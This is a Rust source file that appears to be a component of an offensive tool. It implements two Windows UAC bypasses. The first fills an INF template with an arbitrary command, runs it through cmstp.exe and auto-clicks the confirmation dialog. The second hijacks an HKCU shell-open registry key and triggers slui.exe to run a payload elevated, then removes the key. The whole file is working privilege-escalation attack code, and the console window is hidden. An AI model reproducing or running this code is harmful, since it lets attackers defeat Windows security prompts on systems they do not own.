#![windows_subsystem = "windows"]
use std::env::args;
use std::ffi::CString;
use std::fs::File;
use std::io::Write;
use std::process::{Command, Stdio};
use std::ptr::null_mut;
use std::thread;
use std::time::Duration;
use winapi::um::winuser::{
    FindWindowA, FindWindowExA, SendMessageA, SetForegroundWindow, ShowWindow, BM_CLICK,
    SW_SHOWNORMAL,
};
use winapi::um::winuser::{SendInput, INPUT, INPUT_KEYBOARD, KEYBDINPUT, VK_RETURN};
#[cfg(target_os = "windows")]
use winreg::enums::*;
#[cfg(target_os = "windows")]
use winreg::RegKey;

/// Create/modify a registry value under HKCU
#[cfg(target_os = "windows")]
pub fn set_hkcu_value(
    path: &str,
    name: Option<&str>,        // None => (Default)
    value: Option<&str>,       // None => no data
    create: bool,
) -> std::io::Result<()> {
    use winreg::enums::*;
    use winreg::RegKey;

    let hkcu = RegKey::predef(HKEY_CURRENT_USER);

    let key = if create {
        hkcu.create_subkey(path)?.0
    } else {
        hkcu.open_subkey_with_flags(path, KEY_SET_VALUE)?
    };

    match (name, value) {
        // named value with data
        (Some(n), Some(v)) => key.set_value(n, &v)?,

        // default value with data
        (None, Some(v)) => key.set_value("", &v)?,

        // named value with NO data
        (Some(n), None) => key.set_value(n, &"")?, // see note below

        // default value with NO data
        (None, None) => key.set_value("", &"")?,
    }

    Ok(())
}
static INF_TEMPLATE: &str = r#"[version]
Signature=$chicago$
AdvancedINF=2.5

[DefaultInstall]
CustomDestination=CustInstDestSectionAllUsers
RunPreSetupCommands=RunPreSetupCommandsSection

[RunPreSetupCommandsSection]
REPLACE_COMMAND_LINE
taskkill /IM cmstp.exe /F

[CustInstDestSectionAllUsers]
49000,49001=AllUSer_LDIDSection, 7

[AllUSer_LDIDSection]
"HKLM", "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\CMMGR32.EXE", "ProfileInstallPath", "%UnexpectedError%", ""

[Strings]
ServiceName="CorpVPN"
ShortSvcName="CorpVPN"
"#;

pub fn generate_inf_file(command: &str) -> String {
    let temp_dir = "C:\\windows\\temp";
    let random_file_name = format!("{}\\{}.inf", temp_dir, uuid::Uuid::new_v4());
    let inf_data = INF_TEMPLATE.replace("REPLACE_COMMAND_LINE", command);

    let mut file = File::create(&random_file_name).expect("Failed to create INF file");
    file.write_all(inf_data.as_bytes())
        .expect("Failed to write INF file");

    random_file_name
}

fn execute_cmstp(inf_file: &str) {
    let binary_path = "C:\\windows\\system32\\cmstp.exe";

    if !std::path::Path::new(binary_path).exists() {
        eprintln!("cmstp.exe binary not found!");
        return;
    }

    let mut child = Command::new(binary_path)
        .arg("/au")
        .arg(inf_file)
        .stdout(Stdio::null())
        .stderr(Stdio::null())
        .spawn()
        .expect("Failed to start cmstp.exe");

    let window_titles = ["CorpVPN", "cmstp","Connection Manager Profile Installer","cmstp.exe"];

    for title in &window_titles {
        if interact_with_window(title) {
            break;
        }
    }
    child.wait().expect("Failed to wait on cmstp.exe");
}

fn interact_with_window(process_name: &str) -> bool {
    let class_name = CString::new(process_name).unwrap();

    loop {
        unsafe {
            let hwnd = FindWindowA(null_mut(), class_name.as_ptr());
            if hwnd.is_null() {
                continue;
            }

            SetForegroundWindow(hwnd);
            ShowWindow(hwnd, SW_SHOWNORMAL);

            let ok_button = FindWindowExA(
                hwnd,
                null_mut(),
                null_mut(),
                CString::new("OK").unwrap().as_ptr(),
            );

            SendMessageA(ok_button, BM_CLICK, 0, 0);
            simulate_keypress();

            return true;
        }
    }
}

fn simulate_keypress() {
    unsafe {
        let mut input = INPUT {
            type_: INPUT_KEYBOARD,
            u: std::mem::zeroed(),
        };

        *input.u.ki_mut() = KEYBDINPUT {
            wVk: VK_RETURN as u16,
            wScan: 0,
            dwFlags: 0,
            time: 0,
            dwExtraInfo: 0,
        };

        SendInput(1, &mut input, std::mem::size_of::<INPUT>() as i32);
    }
}

pub fn delete_hkcu_key(path: &str) -> std::io::Result<()> {
    let hkcu = RegKey::predef(HKEY_CURRENT_USER);

    match hkcu.delete_subkey_all(path) {
        Ok(_) => {
            println!("Successfully cleaned up");
            Ok(())
        }
        Err(e) => {
            eprintln!("Failed to delete key: {}", e);
            Err(e)
        }
    }
}

pub fn uac_slui(payload: &String) {
    let path = "Software\\Classes\\Launcher.SystemSettings\\shell\\open\\command";

    // 🔹 best effort cleanup before starting
    let _ = delete_hkcu_key(path);

    // 🔹 create default value
    if let Err(e) = set_hkcu_value(path, None, Some(payload.as_str()), true) {
        eprintln!("Failed to set default value: {}", e);
        let _ = delete_hkcu_key(path);
        return;
    }

    // 🔹 create DelegateExecute
    if let Err(e) = set_hkcu_value(path, Some("DelegateExecute"), None, true) {
        eprintln!("Failed to set DelegateExecute: {}", e);
        let _ = delete_hkcu_key(path);
        return;
    }

    thread::sleep(Duration::from_secs(5));

    // 🔹 launch trigger
    if let Err(e) = Command::new("slui.exe")
        .stdout(Stdio::null())
        .stderr(Stdio::null())
        .spawn()
    {
        eprintln!("Failed to launch slui.exe: {}", e);
        let _ = delete_hkcu_key(path);
        return;
    }
}

pub fn elevate_uac(command: &String){
    let inf_file = self::generate_inf_file(&command);
    self::execute_cmstp(&inf_file);
}

